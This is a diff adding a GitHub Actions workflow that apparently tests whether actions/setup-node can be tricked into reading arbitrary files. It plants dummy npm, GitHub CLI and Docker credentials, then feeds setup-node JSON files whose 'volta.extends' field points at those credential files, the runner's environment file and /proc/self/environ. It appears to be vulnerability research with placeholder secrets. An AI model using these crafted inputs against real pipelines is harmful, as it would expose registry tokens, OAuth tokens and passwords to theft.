@@ -1,0 +1,66 @@
+name: setup-node escalation test
+on: workflow_dispatch
+jobs:
+  npmrc-test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: Write dummy .npmrc token (simulates a prior workflow step)
+        run: |
+          echo "//registry.npmjs.org/:_authToken=npm_DUMMY_TEST_TOKEN_12345" > /home/runner/.npmrc
+          echo "//custom-registry.example.com/:_authToken=secret_REGISTRY_KEY_67890" >> /home/runner/.npmrc
+          echo "Wrote .npmrc with dummy tokens"
+          
+      - name: Create payload package.json for .npmrc read
+        run: echo '{"volta":{"extends":"/home/runner/.npmrc"}}' > volta-npmrc-test.json
+        
+      - uses: actions/setup-node@v4
+        id: npmrc-read
+        with:
+          node-version-file: volta-npmrc-test.json
+        continue-on-error: true
+        
+      - name: Write dummy gh hosts.yml (simulates gh auth login)
+        run: |
+          mkdir -p /home/runner/.config/gh
+          cat > /home/runner/.config/gh/hosts.yml << 'EOF'
+          github.com:
+            oauth_token: gho_DUMMY_OAUTH_TOKEN_ABCDEF123456
+            user: testuser
+            git_protocol: https
+          EOF
+          echo "Wrote gh hosts.yml with dummy oauth token"
+          
+      - name: Create payload for gh hosts.yml read
+        run: echo '{"volta":{"extends":"/home/runner/.config/gh/hosts.yml"}}' > volta-gh-test.json
+        
+      - uses: actions/setup-node@v4
+        id: gh-read
+        with:
+          node-version-file: volta-gh-test.json
+        continue-on-error: true
+        
+      - name: Write dummy docker config (simulates docker login)
+        run: |
+          mkdir -p /home/runner/.docker
+          echo '{"auths":{"https://index.docker.io/v1/":{"auth":"dGVzdHVzZXI6RFVNTV9ET0NLRVJfUEFTU1dPUkRfOTk5"}}}' > /home/runner/.docker/config.json
+          echo "Wrote docker config with dummy auth"
+          
+      - name: Create payload for docker config read
+        run: echo '{"volta":{"extends":"/home/runner/.docker/config.json"}}' > volta-docker-test.json
+        
+      - uses: actions/setup-node@v4
+        id: docker-read
+        with:
+          node-version-file: volta-docker-test.json
+        continue-on-error: true
+
+      - name: Test workflow env file
+        run: echo '{"volta":{"extends":"/home/runner/work/_temp/_runner_file_commands/set_env_'$(ls /home/runner/work/_temp/_runner_file_commands/ | grep set_env | head -1 | sed 's/set_env_//')'"}}' > volta-env-test.json 2>/dev/null || echo '{"volta":{"extends":"/proc/self/environ"}}' > volta-env-test.json
+
+      - uses: actions/setup-node@v4
+        id: env-read
+        with:
+          node-version-file: volta-env-test.json
+        continue-on-error: true
